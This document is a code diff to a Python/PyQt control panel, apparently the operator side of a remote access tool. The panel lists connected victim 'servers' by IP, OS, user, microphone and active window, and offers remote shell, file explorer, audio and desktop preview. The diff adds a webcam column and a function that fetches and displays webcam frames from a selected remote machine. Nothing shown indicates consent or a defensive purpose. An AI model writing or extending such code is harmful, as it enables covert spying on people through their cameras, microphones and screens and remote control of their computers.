@@ -96,6 +96,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.quitServerButton.setDisabled(True)
         self.unlockServerButton.setDisabled(True)
         self.updatePreviewButton.setDisabled(True)
+        self.getWebcamButton.setDisabled(True)
 
         # indexes for servers table
         self.index_of_ipAddress = 0
@@ -104,7 +105,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.index_of_os = 3
         self.index_of_user = 4
         self.index_of_microphone = 5
-        self.index_of_activeWindowTitle = 6
+        self.index_of_webcamera = 6
+        self.index_of_activeWindowTitle = 7
         # initialize servers table columns width
         self.serversTable.setColumnWidth(self.index_of_ipAddress, 100)
         self.serversTable.setColumnWidth(self.index_of_socket, 50)
@@ -112,6 +114,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.serversTable.setColumnWidth(self.index_of_os, 90)
         self.serversTable.setColumnWidth(self.index_of_user, 90)
         self.serversTable.setColumnWidth(self.index_of_microphone, 50)
+        self.serversTable.setColumnWidth(self.index_of_webcamera, 50)
         # servers table double click trigger
         self.serversTable.doubleClicked.connect(self.unlock_server)
         # Initializing right click menu
@@ -123,10 +126,11 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.startListenButton.clicked.connect(self.listen_start)
         self.stopListenButton.clicked.connect(self.listen_stop)
         self.clientSettingsButton.clicked.connect(self.run_settings)
-        #self.serversTable.clicked.connect(self.update_preview)
+        self.serversTable.clicked.connect(self.update_preview)
 
         # Panel Triggers
         self.updatePreviewButton.clicked.connect(self.get_desktop_preview)
+        self.getWebcamButton.clicked.connect(self.get_webcam_preview)
         self.unlockServerButton.clicked.connect(self.unlock_server)
         self.lockServerButton.clicked.connect(self.lock_server)
         self.quitServerButton.clicked.connect(self.lock_server)
@@ -247,6 +251,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                     self.socks[socket_index]['os'] = info['os']
                     self.socks[socket_index]['user'] = info['user']
                     self.socks[socket_index]['inputdevice'] = info['inputdevice']
+                    self.socks[socket_index]['webcamdevice'] = info['webcamdevice']
                     self.socks[socket_index]['activewindowtitle'] = info['activewindowtitle']
 
                     get(self.sock, 'startChildSocket %s' % socket_index, 'streamingMode')
@@ -311,6 +316,20 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             except SyntaxError:
                 pass
 
+    def get_webcam_preview(self):
+        server = self.current_server()
+        if server:
+            try:
+                webcam_dict = get(self.socks[server]['sock'], 'getWebcam', 'webcamera')
+                webcam_info = ast.literal_eval(webcam_dict)
+                im = Image.fromstring('RGB', (int(webcam_info['width']), int(webcam_info['height'])),
+                                      zlib.decompress(webcam_info['webcambits']), 'raw', 'BGR', 0, -1)
+                webcam_bits = im.convert('RGBA')
+                self.webcamLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(webcam_bits)).scaled(
+                    self.webcamLabel.size(), Qt.KeepAspectRatio))
+            except SyntaxError:
+                pass
+
     # Update Servers Table from self.socks
     def updateServersTable(self):
         self.serversTable.setRowCount(len(self.streaming_socks))
@@ -349,7 +368,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                 self.serversTable.setItem(index, self.index_of_user, item)
 
-                # add servers version
+                # add input device
                 item = QTableWidgetItem()
                 if self.socks[obj]['inputdevice'] == 'NoDevice':
                     item.setText('No')
@@ -358,6 +377,16 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                     item.setText('Yes')
                     item.setIcon(QIcon(os.path.join(assets, 'mic_yes.png')))
                 self.serversTable.setItem(index, self.index_of_microphone, item)
+
+                # add webcam device
+                item = QTableWidgetItem()
+                if self.socks[obj]['webcamdevice'] == 'NoDevice':
+                    item.setText('No')
+                    item.setIcon(QIcon(os.path.join(assets, 'web_camera_no.png')))
+                else:
+                    item.setText('Yes')
+                    item.setIcon(QIcon(os.path.join(assets, 'web_camera.png')))
+                self.serversTable.setItem(index, self.index_of_webcamera, item)
 
                 # add active windows title
                 item = QTableWidgetItem(self.streaming_socks[obj]['activewindowtitle'])
@@ -394,8 +423,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             send(self.socks[server]['sock'], 'lock')
 
     def update_preview(self):
-        self.get_desktop_preview()
-        self.emit(SIGNAL('updatePanel()'))
+        server = self.current_server()
+        if server:
+            self.webcamNameButton.setText(self.socks[server]['webcamdevice'])
 
     def update_main_menu(self):
         try:
@@ -403,6 +433,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.unlockServerButton.setVisible(True)
                 self.unlockServerButton.setDisabled(False)
                 self.updatePreviewButton.setDisabled(False)
+                server = self.current_server()
+                if self.socks[server]['webcamdevice'] != 'NoDevice':
+                    self.getWebcamButton.setDisabled(False)
+
                 self.remoteExplorerButton.setDisabled(True)
                 self.remoteShellButton.setDisabled(True)
                 self.remoteAudioButton.setDisabled(True)
@@ -426,6 +460,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.unlockServerButton.setVisible(False)
                 self.unlockServerButton.setDisabled(True)
                 self.updatePreviewButton.setDisabled(False)
+                server = self.current_server()
+                if self.socks[server]['webcamdevice'] != 'NoDevice':
+                    self.getWebcamButton.setDisabled(False)
         except:
             self.remoteExplorerButton.setDisabled(True)
             self.remoteShellButton.setDisabled(True)
@@ -439,6 +476,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.unlockServerButton.setVisible(True)
             self.unlockServerButton.setDisabled(True)
             self.updatePreviewButton.setDisabled(True)
+            self.getWebcamButton.setDisabled(True)
 
     def has_microphone(self):
         try:
@@ -490,8 +528,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         try:
             return int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
         except AttributeError:
-            warn = QMessageBox(QMessageBox.Warning, 'Error', 'No Server Selected', QMessageBox.Ok)
-            warn.exec_()
             return False
 
     def send_run_signal(self, sock, signal):
